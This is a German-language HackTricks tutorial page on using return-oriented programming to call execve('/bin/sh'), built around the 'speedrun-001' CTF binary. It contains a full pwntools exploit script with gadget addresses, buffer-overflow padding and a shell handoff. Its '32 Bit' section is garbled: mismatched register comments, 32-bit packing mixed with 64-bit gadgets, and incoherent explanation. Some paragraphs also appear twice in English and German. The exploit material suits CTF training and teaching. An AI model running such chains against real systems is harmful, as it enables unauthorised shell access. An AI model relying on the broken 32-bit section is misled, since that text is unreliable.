# ROP - Aufruf von sys\_execve

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

Um den Aufruf f√ºr das **syscall** vorzubereiten, ist die folgende Konfiguration erforderlich:

* `rax: 59 sys_execve angeben`
* `rdi: Zeiger auf "/bin/sh" gibt die auszuf√ºhrende Datei an`
* `rsi: 0 gibt an, dass keine Argumente √ºbergeben werden`
* `rdx: 0 gibt an, dass keine Umgebungsvariablen √ºbergeben werden`

Es ist also im Grunde genommen erforderlich, den String `/bin/sh` irgendwo zu schreiben und dann den `syscall` auszuf√ºhren (wobei darauf geachtet werden muss, dass das Padding ben√∂tigt wird, um den Stack zu kontrollieren).

## Kontrolle der Register

Beginnen wir damit, **wie man diese Register kontrolliert** zu finden:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Mit diesen Adressen ist es m√∂glich, den Inhalt im Stack zu schreiben und in die Register zu laden.

## String schreiben

### Beschreibbarer Speicher

Zuerst musst du einen beschreibbaren Speicherplatz im Speicher finden.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### String schreiben

Dann musst du einen Weg finden, beliebige Inhalte an diese Adresse zu schreiben.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 Bit

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming) ist eine Technik, die von Angreifern verwendet wird, um b√∂sartigen Code auszuf√ºhren, indem sie vorhandenen Code im Speicher wiederverwenden. Bei 32-Bit-Systemen besteht der Speicher normalerweise aus 4-Byte-Adressen. ROP nutzt diese Eigenschaft, indem es eine Kette von Adressen erstellt, die auf bereits vorhandenen Code zeigen.

##### Syscall

Ein Syscall ist eine Schnittstelle zwischen dem Betriebssystem und einer Anwendung. Es erm√∂glicht der Anwendung, auf Betriebssystemfunktionen zuzugreifen, indem sie eine spezifische Nummer verwendet, um den gew√ºnschten Dienst anzufordern. Bei 32-Bit-Systemen wird die Syscall-Nummer in das Register EAX geladen, gefolgt von den Parametern in den Registern EBX, ECX, EDX, ESI, EDI und EBP.

##### execv()

Die Funktion execv() ist eine Systemaufruffunktion, die verwendet wird, um ein neues Programm in einem bestehenden Prozess auszuf√ºhren. Sie erwartet zwei Parameter: den Pfad zur ausf√ºhrbaren Datei und ein Array von Zeichenketten, die die Argumente f√ºr das neue Programm darstellen. Der Syscall f√ºr execv() hat die Nummer 11.

##### ROP + Syscall + execv()

Um execv() mit ROP und Syscall auf einem 32-Bit-System aufzurufen, m√ºssen wir die erforderlichen Registerwerte setzen und die richtige Reihenfolge der Adressen f√ºr die ROP-Kette festlegen. Die ROP-Kette sollte die Adresse der execv() Funktion enthalten, gefolgt von den erforderlichen Registerwerten f√ºr den Syscall. Sobald die ROP-Kette ausgef√ºhrt wird, wird der Syscall aufgerufen und execv() ausgef√ºhrt, um das neue Programm zu starten.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 Bit

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming) ist eine Technik, die von Angreifern verwendet wird, um b√∂sartigen Code auszuf√ºhren, indem sie vorhandenen Code im Speicher wiederverwenden. Bei 64-Bit-Systemen besteht der Speicher aus 64-Bit-Adressen, was bedeutet, dass die ROP-Ketten l√§nger sein m√ºssen, um gen√ºgend Platz f√ºr die erforderlichen Adressen zu bieten.

##### Syscall

Ein Syscall ist eine Schnittstelle zwischen dem Betriebssystem und einer Anwendung, die es der Anwendung erm√∂glicht, auf Betriebssystemfunktionen zuzugreifen. Bei 64-Bit-Systemen werden Syscalls √ºber die Register `rax`, `rdi`, `rsi`, `rdx`, `r10` und `r8` aufgerufen.

##### execv()

Die Funktion `execv()` ist eine Systemaufruffunktion, die verwendet wird, um ein neues Programm in einem bestehenden Prozess auszuf√ºhren. Sie erwartet zwei Argumente: den Pfad zur ausf√ºhrbaren Datei und ein Array von Zeichenzeigern, die die Argumente f√ºr das neue Programm darstellen.

##### ROP-Syscall-execv()

Um die Funktion `execv()` √ºber ROP aufzurufen, m√ºssen wir die erforderlichen Argumente in den entsprechenden Registern platzieren und dann den Syscall ausl√∂sen. Dies kann erreicht werden, indem wir ROP-Gadgets verwenden, um die Werte in die richtigen Register zu schreiben und dann einen geeigneten Syscall-Gadget verwenden, um den Syscall auszul√∂sen.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Beispiel

In this example, we will use a Return-Oriented Programming (ROP) technique to execute the `execv` system call in Linux.

In diesem Beispiel verwenden wir eine Return-Oriented Programming (ROP)-Technik, um den `execv`-Systemaufruf in Linux auszuf√ºhren.

First, we need to find the addresses of the gadgets we will use in our ROP chain. We can use tools like `ROPgadget` or `ropper` to search for gadgets in the binary.

Zuerst m√ºssen wir die Adressen der Gadgets finden, die wir in unserer ROP-Kette verwenden werden. Wir k√∂nnen Tools wie `ROPgadget` oder `ropper` verwenden, um nach Gadgets in der Bin√§rdatei zu suchen.

Once we have the addresses, we can construct our ROP chain. The ROP chain will consist of the addresses of the gadgets we want to use, followed by the arguments for the `execv` system call.

Sobald wir die Adressen haben, k√∂nnen wir unsere ROP-Kette konstruieren. Die ROP-Kette besteht aus den Adressen der Gadgets, die wir verwenden m√∂chten, gefolgt von den Argumenten f√ºr den `execv`-Systemaufruf.

To execute the `execv` system call, we need to set the registers accordingly. The first argument (`filename`) should point to the path of the executable we want to execute, and the second argument (`argv`) should point to an array of strings containing the command-line arguments.

Um den `execv`-Systemaufruf auszuf√ºhren, m√ºssen wir die Register entsprechend setzen. Das erste Argument (`filename`) sollte auf den Pfad der auszuf√ºhrenden ausf√ºhrbaren Datei zeigen, und das zweite Argument (`argv`) sollte auf ein Array von Zeichenketten zeigen, das die Befehlszeilenargumente enth√§lt.

Finally, we can trigger the ROP chain by overflowing a buffer and redirecting the program's execution flow to the beginning of our ROP chain.

Schlie√ülich k√∂nnen wir die ROP-Kette ausl√∂sen, indem wir einen Puffer √ºberlaufen lassen und den Ausf√ºhrungsfluss des Programms zum Anfang unserer ROP-Kette umleiten.
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Referenzen

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
